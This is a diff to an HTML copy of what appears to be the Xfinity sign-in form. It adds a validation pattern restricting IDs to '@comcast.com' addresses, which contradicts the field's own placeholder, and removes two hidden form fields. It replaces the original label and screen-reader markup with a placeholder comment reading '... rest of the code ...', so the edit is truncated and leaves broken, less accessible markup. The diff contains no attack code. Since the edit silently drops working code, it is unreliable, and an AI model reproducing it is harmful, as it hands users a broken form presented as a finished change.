@@ -2358,16 +2358,18 @@
           <prism-input-text id="userInput" name="user" label="Enter your Xfinity ID" hide-label="true"
             placeholder="Email, mobile, or username" value="" autocomplete="username" autocorrect="off"
             auto-capitalize="off" spellcheck="false" maxlength="128" required="true"
-            data-value-missing="Please enter your Xfinity ID to sign in."
-            class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated"><!----><span
-              class="screen-reader-text sc-prism-input-text" aria-live="assertive"></span><label
-              class="sc-prism-input-text" for="user"><prism-text
-                class="label-text screen-reader-text sc-prism-input-text caption hydrated">Enter your Xfinity
-                ID</prism-text></label><span class="wrap sc-prism-input-text sc-prism-input-text-s"><input
-                class="input text contained body1 sc-prism-input-text" id="user" autocapitalize="off"
+            pattern="[a-zA-Z0-9._%+-]+@comcast.com" data-value-missing="Please enter your Xfinity ID to sign in."
+            data-pattern-mismatch="Please enter a valid Xfinity ID (e.g., yourname@comcast.com)"
+            class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated">
+            <!-- ... rest of the code ... -->
+            <span class="wrap sc-prism-input-text sc-prism-input-text-s">
+              <input class="input text contained body1 sc-prism-input-text" id="user" autocapitalize="off"
                 autocomplete="username" autocorrect="off" inputmode="text" maxlength="128" name="user"
                 placeholder="Email, mobile, or username" required="" type="text" aria-invalid="false"
-                aria-required="true"></span></prism-input-text>
+                aria-required="true">
+            </span>
+          </prism-input-text>
+
 
           <prism-text id="implied-legal" display="body3" class="text-block body3 hydrated"><template
               shadowrootmode="open">
@@ -2385,8 +2387,7 @@
                     <slot></slot>
                   </span></template>Let's go</prism-text></button></prism-button>
 
-          <input type="hidden" name="r" value="comcast.net">
-          <input type="hidden" name="s" value="portal">
+
         </form>
 
 
@@ -2498,7 +2499,7 @@
       </div>
     </aside>
   </main>
-  
+
 
 
 </body>
